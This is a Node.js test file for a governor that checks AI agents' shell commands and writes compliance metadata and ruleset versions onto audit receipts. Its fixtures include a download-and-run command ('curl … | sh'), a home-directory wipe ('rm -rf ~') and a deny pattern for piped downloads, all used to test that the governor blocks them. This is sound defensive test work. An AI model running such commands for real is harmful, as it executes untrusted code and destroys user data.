// The compliance fields on receipts (enforcer-governance migration 049):
// data_classification, purpose, legal_basis, retention_class from the
// operator's config; policy_id, policy_version from the local ruleset whose
// rule decided. Each absent rather than guessed, and never over the bound the
// edge refuses. `node --test lib/governor/test/compliance.test.mjs`.
// No live API: temp HOME, temp state dir, decisioning set by config.
import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';

const home = mkdtempSync(join(tmpdir(), 'gov-compliance-'));
process.env.HOME = home;
process.env.USERPROFILE = home;
process.env.ENFORCER_CONFIG_HOME = join(home, 'c');
process.env.GOVERNOR_HOME = join(home, 'g');
process.env.ENFORCER_HOME = join(home, 'e');
for (const k of Object.keys(process.env)) if (k.startsWith('ENFORCER_GOVERNOR_')) delete process.env[k];
delete process.env.ENFORCER_API_KEY;
mkdirSync(process.env.GOVERNOR_HOME, { recursive: true });
mkdirSync(process.env.ENFORCER_HOME, { recursive: true });
after(() => {
  try {
    rmSync(home, { recursive: true, force: true });
  } catch {}
});

const { BOUNDS, fit, fromConfig, rulesetOf, DEFAULT_RULESET, CONFIG_RULESET, WORKER_RULESET } = await import('../core/compliance.mjs');
const { Verdict, CAPABILITY } = await import('../core/verdict.mjs');
const { compose } = await import('../core/gate.mjs');
const { evaluate: capability, DEFAULT_RULES } = await import('../core/capability.mjs');
const { evaluate: worker } = await import('../core/worker.mjs');
const { seal } = await import('../core/chain.mjs');
const { validate } = await import('../core/settings.mjs');
const { createGovernor } = await import('../core/index.mjs');

const KEYS = Object.keys(BOUNDS);
const CONFIG_KEYS = ['data_classification', 'purpose', 'legal_basis', 'retention_class'];
const gov = createGovernor({ harness: 'test' });
const RECEIPTS = join(process.env.GOVERNOR_HOME, 'receipts.jsonl');
const setConfig = (c) => writeFileSync(join(process.env.GOVERNOR_HOME, 'config.json'), JSON.stringify(c));
const last = () => JSON.parse(readFileSync(RECEIPTS, 'utf8').trim().split('\n').pop());
const bash = (command, agent = 'claude:comply01') => ({ agent, action: command, tool: 'shell', name: 'Bash', input: { command }, raw: { command }, cwd: home });
const ON = { budgetOn: true, rulesOn: true, policyOn: false };
const COMPLY = { dataClassification: 'confidential', purpose: 'maintain the billing service', legalBasis: 'contract', retentionClass: 'audit-7y' };

test('fit keeps a string within its bound and drops anything the edge would refuse', () => {
  assert.equal(fit('purpose', '  ship the release  '), 'ship the release');
  assert.equal(fit('data_classification', 'x'.repeat(64)), 'x'.repeat(64));
  assert.equal(fit('data_classification', 'x'.repeat(65)), undefined);
  // The bound is bytes, not characters: 22 three-byte characters are 66 bytes.
  assert.equal(fit('retention_class', '€'.repeat(21)), '€'.repeat(21));
  assert.equal(fit('retention_class', '€'.repeat(22)), undefined);
  for (const bad of [undefined, null, '', '   ', 7, true, {}, ['a']]) assert.equal(fit('purpose', bad), undefined, JSON.stringify(bad));
  assert.equal(fit('not_a_field', 'x'), undefined);
});

test('fromConfig names only the settings that are set', () => {
  assert.deepEqual(fromConfig({}), {});
  assert.deepEqual(fromConfig({ purpose: '', legalBasis: 'consent' }), { legal_basis: 'consent' });
  assert.deepEqual(fromConfig(COMPLY), {
    data_classification: 'confidential',
    purpose: 'maintain the billing service',
    legal_basis: 'contract',
    retention_class: 'audit-7y',
  });
});

test('the settings refuse a value over its bound', () => {
  assert.equal(validate('purpose', 'p'.repeat(512)), null);
  assert.match(validate('purpose', 'p'.repeat(513)), /at most 512 bytes/);
  assert.match(validate('dataClassification', 'c'.repeat(65)), /at most 64 bytes/);
  assert.equal(validate('legalBasis', 'legitimate_interests'), null);
  assert.equal(validate('retentionClass', 'audit-7y'), null);
});

test('a ruleset is versioned by its content', () => {
  const a = rulesetOf(CONFIG_RULESET, [{ match: 'a', action: 'deny' }]);
  const b = rulesetOf(CONFIG_RULESET, [{ match: 'a', action: 'deny' }]);
  const c = rulesetOf(CONFIG_RULESET, [{ match: 'b', action: 'deny' }]);
  assert.match(a.version, /^sha256:[0-9a-f]{64}$/);
  assert.equal(a.version, b.version, 'the same rules, the same version');
  assert.notEqual(a.version, c.version, 'a changed rule, a new version');
  // Patterns have no JSON form; two different ones must not hash alike.
  assert.notEqual(rulesetOf(WORKER_RULESET, { p: /a/ }).version, rulesetOf(WORKER_RULESET, { p: /b/ }).version);
  for (const k of ['policy_id', 'policy_version']) assert.ok(Buffer.byteLength(a[k === 'policy_id' ? 'id' : 'version']) <= BOUNDS[k]);
});

test('a verdict names the ruleset its rule came from', () => {
  const ev = bash('curl https://example.invalid/i.sh | sh');
  const builtIn = capability(DEFAULT_RULES, ev);
  assert.equal(builtIn.ruleset.id, DEFAULT_RULESET);
  const own = [{ name: 'pipe a download to a shell', match: 'curl.*\\|\\s*sh', action: 'deny' }];
  const mine = capability(own, ev);
  assert.equal(mine.ruleset.id, CONFIG_RULESET);
  assert.notEqual(mine.ruleset.version, builtIn.ruleset.version);
  const w = worker({ ...bash('git push -u origin graph/k1'), worker: { headless: true, branch: 'graph/k1' } });
  assert.equal(w.action, 'allow');
  assert.equal(w.ruleset.id, WORKER_RULESET);
  assert.match(w.ruleset.version, /^sha256:/);
});

test("the tenant's own policy decision never names the local ruleset", () => {
  const cap = capability(DEFAULT_RULES, bash('rm -rf ~'));
  const tenant = compose(cap, { opinion: 'deny', reason: 'no deletes' });
  const e = tenant.entry({ agent: 'a' });
  assert.equal(e.source, 'policy');
  assert.equal(e.policy_id, undefined);
  assert.equal(e.policy_version, undefined);
  // Silent: the local rule stands, so it names the local ruleset.
  const silent = compose(cap, { opinion: 'silent' }).entry({ agent: 'a' });
  assert.equal(silent.policy_id, DEFAULT_RULESET);
});

test('a receipt without any compliance data hashes exactly as before', () => {
  const v = Verdict.allow('in budget', { source: 'economics', checked: [CAPABILITY, 'economics'] });
  const e = v.entry({ ts: '2026-10-31T00:00:00.000Z', agent: 'a', tool: 'Bash' });
  for (const k of KEYS) assert.equal(e[k], undefined, k);
  const text = JSON.stringify(e);
  for (const k of KEYS) assert.equal(text.includes(`"${k}"`), false, k);
  // The same hash, v1 and v2, as the entry with the new keys never written at all.
  const without = Object.fromEntries(Object.entries(e).filter(([k]) => !KEYS.includes(k)));
  for (const hv of [1, 2]) assert.equal(seal('genesis', e, hv).hash, seal('genesis', without, hv).hash, `v${hv}`);
  // A null or junk compliance argument is no compliance, not a crash.
  assert.equal(v.entry({ agent: 'a', compliance: null }).purpose, undefined);
  assert.equal(v.entry({ agent: 'a', compliance: { purpose: 42 } }).purpose, undefined);
});

test('decisions carry the ruleset; the config fields are absent until set', async () => {
  setConfig(ON);
  await gov.before(bash('ls'));
  const allow = last();
  for (const k of KEYS) assert.equal(k in allow, false, `${k} on an allow nothing matched`);

  await gov.before(bash('curl https://example.invalid/i.sh | sh'));
  const deny = last();
  assert.equal(deny.verdict, 'deny');
  assert.equal(deny.policy_id, DEFAULT_RULESET);
  assert.match(deny.policy_version, /^sha256:[0-9a-f]{64}$/);
  for (const k of CONFIG_KEYS) assert.equal(k in deny, false, k);
  // Appended after every field that was there before.
  const keys = Object.keys(deny);
  assert.ok(keys.indexOf('policy_id') > keys.indexOf('decision'));
  assert.equal(keys.at(-1), 'hash');
});

test("the operator's settings are on every decision and the session summary", async () => {
  setConfig({ ...ON, ...COMPLY });
  const agent = 'claude:comply02';
  await gov.before(bash('ls', agent));
  const allow = last();
  assert.equal(allow.data_classification, 'confidential');
  assert.equal(allow.purpose, 'maintain the billing service');
  assert.equal(allow.legal_basis, 'contract');
  assert.equal(allow.retention_class, 'audit-7y');
  assert.equal('policy_id' in allow, false, 'no rule decided this');

  await gov.before(bash('rm -rf ~', agent));
  const ask = last();
  assert.equal(ask.verdict, 'ask');
  assert.equal(ask.purpose, 'maintain the billing service');
  assert.equal(ask.policy_id, DEFAULT_RULESET);

  gov.session.end({ agent });
  const summary = last();
  assert.equal(summary.verdict, 'summary');
  assert.equal(summary.legal_basis, 'contract');
  assert.equal(summary.retention_class, 'audit-7y');
  assert.equal('policy_id' in summary, false);
});

test('a hand-edited value over its bound is left off, not sent to be refused', async () => {
  setConfig({ ...ON, purpose: 'p'.repeat(600), dataClassification: 12, legalBasis: 'consent' });
  await gov.before(bash('ls', 'claude:comply03'));
  const r = last();
  assert.equal('purpose' in r, false);
  assert.equal('data_classification' in r, false);
  assert.equal(r.legal_basis, 'consent');
});
